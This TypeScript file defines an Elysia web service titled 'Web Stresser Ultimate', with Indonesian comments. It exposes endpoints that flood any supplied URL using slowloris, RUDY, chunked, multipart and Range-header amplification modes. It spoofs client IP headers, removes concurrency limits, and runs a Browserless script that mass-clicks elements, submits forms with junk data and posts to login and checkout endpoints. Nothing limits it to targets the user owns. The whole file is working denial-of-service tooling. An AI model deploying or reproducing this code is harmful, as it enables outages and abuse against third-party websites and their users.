import { Elysia, t } from 'elysia';
import { setGlobalDispatcher, Agent } from 'undici';
import autocannon from 'autocannon';

// Konfigurasi koneksi pool ekstrem
const globalAgent = new Agent({
  connections: 10000,         // maksimum koneksi
  pipelining: 100,            // pipeline tinggi
  keepAliveTimeout: 300000,   // 5 menit
});
setGlobalDispatcher(globalAgent);

const activeUsers = new Map<string, number>();
setInterval(() => {
  const now = Date.now();
  for (const [key, timestamp] of activeUsers.entries()) {
    if (now - timestamp > 60000) activeUsers.delete(key);
  }
}, 30000);

// Helper random yang lebih berbahaya (bisa juga pakai crypto)
function randomString(n: number): string {
  const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
  let result = '';
  for (let i = 0; i < n; i++) result += chars[Math.floor(Math.random() * chars.length)];
  return result;
}

function generateAmplificationPayload(kb: number, ampType: string): string {
  if (kb <= 0) return '';
  const size = kb * 1024;
  if (ampType === 'range') return '';
  // payload lebih acak dan besar
  let result = '';
  for (let i = 0; i < size; i += 1024) {
    result += randomString(Math.min(1024, size - i));
  }
  return result;
}

// Menambahkan random headers jika tidak ada
function injectRandomHeaders(headers: Record<string, string>): Record<string, string> {
  const randomHeaders: Record<string, string> = {};
  // Spoof IP
  randomHeaders['X-Forwarded-For'] = `${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}`;
  randomHeaders['X-Real-IP'] = `${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}`;
  randomHeaders['X-Originating-IP'] = randomHeaders['X-Forwarded-For'];
  randomHeaders['Accept-Language'] = ['en-US,en;q=0.9','id-ID,id;q=0.9','zh-CN,zh;q=0.8','ja-JP,ja;q=0.7'][Math.floor(Math.random()*4)];
  randomHeaders['Accept-Encoding'] = 'gzip, deflate, br';
  randomHeaders['Cache-Control'] = 'no-cache, no-store, must-revalidate';
  randomHeaders['Pragma'] = 'no-cache';
  randomHeaders['Expires'] = '0';
  randomHeaders['Upgrade-Insecure-Requests'] = '1';
  // Gabungkan dengan headers user
  return { ...randomHeaders, ...headers };
}

interface SingleAttackParams {
  url: string;
  method: string;
  headers: Record<string, string>;
  body: string;
  timeout: number;
  retryCount: number;
  randomDelay: number;
  keepAlive: boolean;
  attackType: string;
  amplifyKB: number;
  amplifyEnabled: boolean;
  amplifyType: string;
}

async function singleAttack(params: SingleAttackParams): Promise<any> {
  const {
    url, method, headers, body,
    timeout, retryCount, randomDelay,
    keepAlive, attackType, amplifyKB, amplifyEnabled, amplifyType,
  } = params;

  let finalMethod = method.toUpperCase();
  let finalUrl = url;
  let finalHeaders = injectRandomHeaders({ ...headers }); // tambah random headers
  let finalBody = body || '';
  let useBody = false;

  if (randomDelay > 0) await new Promise(r => setTimeout(r, Math.random() * randomDelay));

  let ampPayload = '';
  if (amplifyEnabled && amplifyKB > 0) {
    ampPayload = generateAmplificationPayload(amplifyKB, amplifyType);
  }

  switch (attackType) {
    case 'range':
      finalHeaders['Range'] = `bytes=0-${amplifyKB * 1024}`;
      break;
    case 'chunked':
      finalBody = body + ampPayload;
      useBody = true;
      finalHeaders['Transfer-Encoding'] = 'chunked';
      break;
    case 'multipart':
      const boundary = `----WebKitFormBoundary${randomString(16)}`;
      finalHeaders['Content-Type'] = `multipart/form-data; boundary=${boundary}`;
      const part = `--${boundary}\r\nContent-Disposition: form-data; name="file"; filename="amp.txt"\r\nContent-Type: text/plain\r\n\r\n${ampPayload}\r\n--${boundary}--\r\n`;
      finalBody = part;
      useBody = true;
      break;
    case 'slowloris':
      finalHeaders['Connection'] = 'keep-alive';
      break;
    case 'rudy':
      await new Promise(r => setTimeout(r, 2000));
      if (amplifyEnabled && ampPayload) finalBody = body + ampPayload;
      else finalBody = body;
      useBody = true;
      break;
    default:
      if (amplifyEnabled && ampPayload) finalBody = body + ampPayload;
      else finalBody = body;
      useBody = true;
  }

  // Aturan untuk GET dengan amplification besar
  if (amplifyEnabled && amplifyKB > 0 && (finalMethod === 'GET' || finalMethod === 'HEAD') && ampPayload.length > 2048) {
    finalMethod = 'POST';
    useBody = true;
    finalBody = ampPayload;
  } else if (amplifyEnabled && amplifyKB > 0 && (finalMethod === 'GET' || finalMethod === 'HEAD') && ampPayload.length <= 2048) {
    const separator = finalUrl.includes('?') ? '&' : '?';
    finalUrl += `${separator}_amp=${encodeURIComponent(ampPayload)}`;
    useBody = false;
  }

  if (!finalHeaders['Accept']) finalHeaders['Accept'] = '*/*';
  if (keepAlive) finalHeaders['Connection'] = 'keep-alive';
  else finalHeaders['Connection'] = 'close';

  const fetchOptions: any = {
    method: finalMethod,
    headers: finalHeaders,
    signal: AbortSignal.timeout(timeout), // tanpa batasan
    dispatcher: globalAgent,
    // redirect: 'follow' (default) lebih agresif
  };
  if (useBody && (finalMethod === 'POST' || finalMethod === 'PUT' || finalMethod === 'PATCH')) {
    fetchOptions.body = finalBody;
  }

  let lastError: any = null;
  let lastStatusCode = 0;
  let responseSize = 0;
  let responsePreview = '';
  let durationMs = 0;
  let retriesUsed = 0;

  const baseDelay = 100;
  for (let attempt = 0; attempt <= retryCount; attempt++) {
    if (attempt > 0) await new Promise(r => setTimeout(r, baseDelay * attempt));
    const start = Date.now();
    try {
      const res = await fetch(finalUrl, fetchOptions);
      durationMs = Date.now() - start;
      lastStatusCode = res.status;
      const buffer = await res.arrayBuffer();
      responseSize = buffer.byteLength;
      const text = new TextDecoder().decode(buffer);
      responsePreview = text.slice(0, 500);
      if (res.status >= 200 && res.status < 400) {
        retriesUsed = attempt;
        break;
      }
    } catch (err: any) {
      durationMs = Date.now() - start;
      lastError = err;
    }
  }

  const success = lastStatusCode >= 200 && lastStatusCode < 400;
  const errorMsg = lastError ? lastError.message : '';

  return {
    success,
    statusCode: lastStatusCode,
    durationMs,
    error: errorMsg,
    retries: retriesUsed,
    responseSize,
    responseBody: responsePreview,
  };
}

interface BatchAttackParams {
  url: string;
  method: string;
  headers: Record<string, string>;
  body: string;
  timeout: number;
  retryCount: number;
  randomDelay: number;
  keepAlive: boolean;
  attackType: string;
  amplifyKB: number;
  amplifyEnabled: boolean;
  amplifyType: string;
  concurrency: number;
  total: number;
}

async function batchAttack(params: BatchAttackParams): Promise<any> {
  const {
    url, method, headers, body, timeout, retryCount, randomDelay,
    keepAlive, attackType, amplifyKB, amplifyEnabled, amplifyType,
    concurrency, total,
  } = params;

  const startTime = Date.now();
  let totalSuccess = 0;
  let totalFail = 0;
  let totalBytes = 0;
  let allLatencies: number[] = [];

  const runOne = async () => {
    const result = await singleAttack({
      url, method, headers, body, timeout, retryCount, randomDelay,
      keepAlive, attackType, amplifyKB, amplifyEnabled, amplifyType,
    });
    if (result.success) totalSuccess++;
    else totalFail++;
    totalBytes += result.responseSize;
    allLatencies.push(result.durationMs);
  };

  // Tanpa batasan concurrency dan total
  const workers: Promise<void>[] = [];
  let index = 0;
  for (let i = 0; i < concurrency; i++) {
    workers.push(new Promise<void>(async (resolve) => {
      while (index < total) {
        index++;
        await runOne();
      }
      resolve();
    }));
  }
  await Promise.all(workers);

  const totalTime = Date.now() - startTime;
  const avgLatency = allLatencies.length ? allLatencies.reduce((a,b)=>a+b,0)/allLatencies.length : 0;
  const rps = totalTime > 0 ? ((totalSuccess+totalFail) / (totalTime/1000)).toFixed(2) : 0;

  return {
    success: true,
    totalRequests: (totalSuccess+totalFail),
    successCount: totalSuccess,
    failCount: totalFail,
    totalBytes,
    totalTimeMs: totalTime,
    avgLatencyMs: avgLatency,
    rps,
    latencies: allLatencies.slice(0, 100),
  };
}

interface AutocannonOptions {
  url: string;
  connections: number;
  duration: number;
  amount?: number;
  method?: string;
  headers?: Record<string, string>;
  body?: string;
}

async function runAutocannon(options: AutocannonOptions): Promise<any> {
  return new Promise((resolve, reject) => {
    // Tidak ada batasan
    const instance = autocannon(
      {
        url: options.url,
        connections: options.connections,
        duration: options.duration,
        amount: options.amount,
        method: options.method || 'GET',
        headers: options.headers,
        body: options.body,
        pipelining: 10,
        reconnectRate: 0,
      },
      (err: any, result: any) => {
        if (err) reject(err);
        else resolve(result);
      }
    );
    autocannon.track(instance, { renderProgressBar: true });
  });
}

export const app = new Elysia()
  .onError(({ error, set }) => {
    set.status = 200;
    console.error(error);
    const errorMessage = error instanceof Error ? error.message : String(error);
    return { success: false, error: errorMessage };
  })
  .get('/api/status', () => ({
    status: 'ok',
    message: 'Web Stresser Ultimate - Elysia on Vercel (EXTREME MODE)',
    version: '5.0.0',
  }))
  .post('/api/attack', async ({ body }) => {
    try {
      const result = await singleAttack(body as SingleAttackParams);
      return result;
    } catch (err: any) {
      return { success: false, error: err.message, durationMs: 0 };
    }
  }, {
    body: t.Object({
      url: t.String(),
      method: t.String(),
      headers: t.Record(t.String(), t.String()),
      body: t.String(),
      timeout: t.Number(),
      retryCount: t.Number(),
      randomDelay: t.Number(),
      keepAlive: t.Boolean(),
      attackType: t.String(),
      amplifyKB: t.Number(),
      amplifyEnabled: t.Boolean(),
      amplifyType: t.String(),
    }),
  })
  .post('/api/batch', async ({ body }) => {
    try {
      const result = await batchAttack(body as BatchAttackParams);
      return result;
    } catch (err: any) {
      return { success: false, error: err.message };
    }
  }, {
    body: t.Object({
      url: t.String(),
      method: t.String(),
      headers: t.Record(t.String(), t.String()),
      body: t.String(),
      timeout: t.Number(),
      retryCount: t.Number(),
      randomDelay: t.Number(),
      keepAlive: t.Boolean(),
      attackType: t.String(),
      amplifyKB: t.Number(),
      amplifyEnabled: t.Boolean(),
      amplifyType: t.String(),
      concurrency: t.Number(),
      total: t.Number(),
    }),
  })
  .post('/api/autocannon', async ({ body }) => {
    try {
      const result = await runAutocannon(body as AutocannonOptions);
      return { success: true, result };
    } catch (err: any) {
      return { success: false, error: err.message };
    }
  }, {
    body: t.Object({
      url: t.String(),
      connections: t.Number(),
      duration: t.Number(),
      amount: t.Optional(t.Number()),
      method: t.Optional(t.String()),
      headers: t.Optional(t.Record(t.String(), t.String())),
      body: t.Optional(t.String()),
    }),
  })
  .post('/api/bot/browserless', async ({ body }) => {
    const { url } = body;
    const apiKey = process.env.BROWSERLESS_API_KEY;
    if (!apiKey) return { success: false, error: 'Missing API key' };

    // Script Browserless yang sangat agresif (banyak aksi)
    const script = `
export default async ({ page, context }) => {
  const targetUrl = context.url;
  await page.goto(targetUrl, { waitUntil: 'networkidle2', timeout: 30000 });

  // 1. Scroll agresif dan interaksi
  await page.evaluate(async () => {
    let scrollCount = 0;
    while (scrollCount < 30) {
      window.scrollBy(0, Math.random() * 1000);
      await new Promise(resolve => setTimeout(resolve, Math.random() * 200 + 50));
      scrollCount++;
    }
    // Klik beberapa elemen random
    const buttons = Array.from(document.querySelectorAll('button, a, input[type="submit"], .btn'));
    for (let i = 0; i < Math.min(buttons.length, 20); i++) {
      const btn = buttons[Math.floor(Math.random() * buttons.length)];
      try { btn.click(); } catch(e) {}
      await new Promise(r => setTimeout(r, 300));
    }
  });

  // 2. Kumpulkan semua link internal
  const internalLinks = await page.$$eval('a', anchors => 
    anchors.map(a => a.href).filter(h => h && h.startsWith(window.location.origin))
  );
  const uniqueInternal = [...new Set(internalLinks)].slice(0, 50);

  // 3. Kunjungi setiap link internal (buka tab baru)
  for (const link of uniqueInternal) {
    const newPage = await page.browser().newPage();
    await newPage.goto(link, { waitUntil: 'domcontentloaded', timeout: 10000 }).catch(() => {});
    await newPage.evaluate(() => window.scrollTo(0, document.body.scrollHeight));
    await newPage.waitForTimeout(500);
    await newPage.close();
  }

  // 4. Isi dan submit form jika ada
  await page.evaluate(() => {
    const forms = document.querySelectorAll('form');
    forms.forEach(form => {
      const inputs = form.querySelectorAll('input, textarea');
      inputs.forEach(input => {
        if (input.type === 'text' || input.type === 'email' || input.type === 'password') {
          input.value = 'test_' + Math.random().toString(36).substring(7);
        }
      });
      try { form.submit(); } catch(e) {}
    });
  });

  // 5. Kirim banyak request fetch ke endpoint umum
  const endpoints = ['/api', '/login', '/register', '/search', '/contact', '/products', '/cart', '/checkout'];
  for (const endpoint of endpoints) {
    const fullUrl = new URL(endpoint, targetUrl).href;
    await page.evaluate(async (url) => {
      try {
        await fetch(url, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ data: Math.random() }) });
        await fetch(url, { method: 'GET' });
        await fetch(url, { method: 'PUT', body: JSON.stringify({ update: true }) });
      } catch(e) {}
    }, fullUrl);
  }

  const title = await page.title();
  const finalUrl = page.url();
  return {
    data: {
      ok: true,
      title,
      url: finalUrl,
      pagesVisited: uniqueInternal.length + 1,
    },
    type: 'application/json'
  };
}
`;
    try {
      const response = await fetch('https://production-sfo.browserless.io/function?token=' + apiKey, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ code: script, context: { url } })
      });
      const text = await response.text();
      if (!response.ok) {
        return { success: false, error: `Browserless API error (${response.status}): ${text.slice(0, 500)}` };
      }
      let result: unknown = text;
      try { result = JSON.parse(text); } catch {}
      return { success: true, result };
    } catch (err: any) {
      return { success: false, error: err.message };
    }
  }, {
    body: t.Object({
      url: t.String(),
      loop: t.Optional(t.Boolean()),
      intervalMs: t.Optional(t.Number()),
    }),
  })
  .get('/api/heartbeat', ({ request }) => {
    const ip = request.headers.get('x-forwarded-for') || 'unknown';
    const ua = request.headers.get('user-agent') || 'unknown';
    const key = `${ip}|${ua}`;
    activeUsers.set(key, Date.now());
    return { active: activeUsers.size };
  });

export default app;
